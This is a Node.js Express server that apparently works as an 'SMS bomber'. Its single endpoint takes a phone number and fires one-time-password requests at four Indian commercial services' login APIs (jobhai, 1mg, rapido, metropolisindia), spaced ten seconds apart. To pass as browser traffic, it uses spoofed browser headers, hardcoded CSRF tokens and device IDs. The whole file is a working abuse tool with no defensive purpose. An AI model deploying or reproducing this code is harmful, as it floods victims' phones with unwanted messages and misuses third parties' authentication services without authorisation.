const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');
const qs = require('qs');

const app = express();
const port = 3000;

// Middleware to parse JSON bodies
app.use(cors({
    origin: 'https://test.abchometuition.in', // Allow requests from your frontend URL
    methods: ['GET', 'POST'], // Specify the allowed methods
    allowedHeaders: ['Content-Type', 'Authorization'] // Specify the allowed headers
}));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// Function to send OTP using the first API
async function sendOtpFirstApi(phoneNumber) {
    const url = 'https://api.jobhai.com/auth/jobseeker/v3/send_otp';
    const data = { phone: phoneNumber };
    const headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Length': '22',
        'Content-Type': 'application/json;charset=utf-8',
        'device-id': '046145b7-c21f-406c-9d3c-8a91b9cefe6d',
        'Host': 'api.jobhai.com',
        'language': 'en',
        'Origin': 'https://www.jobhai.com',
        'Priority': 'u=0',
        'Referer': 'https://www.jobhai.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'source': 'WEB',
        'TE': 'trailers',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
        'x-transaction-id': 'JS-WEB-5c284e8b-7d39-4de3-ab70-97b60a278305'
    };

    try {
        const response = await axios.post(url, data, { headers });
        return response.data;
    } catch (error) {
        throw new Error('Error sending OTP from first API: ' + (error.response ? error.response.data : error.message));
    }
}

// Function to send OTP using the second API
async function sendOtpSecondApi(phoneNumber) {
    const url = 'https://www.1mg.com/auth_api/v6/create_token';
    const data = {
        number: phoneNumber,
        is_corporate_user: false,
        is_doctor: false
    };
    const headers = {
        'Accept': 'application/vnd.healthkartplus.v11+json',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.5',
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Connection': 'keep-alive',
        'Content-Length': '67',
        'Content-Type': 'application/json',
        'HKP-Platform': 'Healthkartplus-0.0.1-Desktop',
        'Host': 'www.1mg.com',
        'Origin': 'https://www.1mg.com',
        'Pragma': 'no-cache',
        'Priority': 'u=0',
        'Referer': 'https://www.1mg.com/?wpsrc=Google+Organic+Search',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'TE': 'trailers',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
        'visitor-id': '7b8528b8-6cca-4cca-b175-c3bef068d765_00vBg5AwcM_7681_1724092563246',
        'X-CSRF-Token': 'zKF3rGBY-Y-0jVxJwFm-knnPwMQAq5ecvlTU',
        'X-HTML-CanRender': 'True',
        'X-Platform': 'Desktop-0.0.1',
        'x-visitor-id': '7b8528b8-6cca-4cca-b175-c3bef068d765_00vBg5AwcM_7681_1724092563246'
    };

    try {
        const response = await axios.post(url, data, { headers });
        return response.data;
    } catch (error) {
        throw new Error('Error sending OTP from second API: ' + (error.response ? error.response.data : error.message));
    }
}

// Function to send OTP using the third API
async function sendOtpThirdApi(phoneNumber) {
    const url = 'https://customer.rapido.bike/api/otp';
    const data = { mobile: phoneNumber };
    const headers = {
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.5',
        'Cache-Control': 'max-age=0',
        'Connection': 'keep-alive',
        'Content-Length': '23',
        'Content-Type': 'application/json',
        'Host': 'customer.rapido.bike',
        'Origin': 'https://www.rapido.bike',
        'Priority': 'u=0',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'TE': 'trailers',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0'
    };

    try {
        const response = await axios.post(url, data, { headers });
        return response.data;
    } catch (error) {
        throw new Error('Error sending OTP from third API: ' + (error.response ? error.response.data : error.message));
    }
}

// Function to send OTP using the fourth API
async function sendOtpFourthApi(phoneNumber) {
    const url = 'https://www.metropolisindia.com/customerlogin';
    const data = qs.stringify({
        login_input: phoneNumber,
        addbasket_id: '',
        addbasket_type: '',
        isaddbasket: 'no'
    });
    const headers = {
        'Accept': '*/*',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Length': data.length,
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'Host': 'www.metropolisindia.com',
        'Origin': 'https://www.metropolisindia.com',
        'Priority': 'u=0',
        'Referer': 'https://www.metropolisindia.com/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'TE': 'trailers',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
        'X-CSRF-TOKEN': 'D5ZBzERyqKMFFCmuy7tyjooy6vojAWmXxMZR5xrY',
        'X-Requested-With': 'XMLHttpRequest'
    };

    try {
        const response = await axios.post(url, data, { headers });
        return response.data;
    } catch (error) {
        throw new Error('Error sending OTP from fourth API: ' + (error.response ? error.response.data : error.message));
    }
}

// Helper function to send OTP and handle errors
async function sendOtpWithHandling(sendOtpFunction, phoneNumber) {
    try {
        return await sendOtpFunction(phoneNumber);
    } catch (error) {
        console.error(error.message); // Log the error
        return null; // Return null to indicate failure
    }
}

// Endpoint to send OTP from all four APIs with delays
app.post('/api/send-otp', async (req, res) => {
    const { phone } = req.body;

    if (!phone) {
        return res.status(400).json({ error: 'Phone number is required' });
    }

    const responses = [];
    const apiFunctions = [
        sendOtpFirstApi,
        sendOtpSecondApi,
        sendOtpThirdApi,
        sendOtpFourthApi
    ];

    for (const apiFunction of apiFunctions) {
        const response = await sendOtpWithHandling(apiFunction, phone);
        if (response) {
            responses.push(response);
        }
        // Wait for 10 seconds before the next API call
        await new Promise(resolve => setTimeout(resolve, 10000));
    }

    res.json({
        message: 'OTPs sent process completed!',
        responses
    });
});

// Serve static files (client-side HTML)
app.use(express.static(path.join(__dirname, 'public')));

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
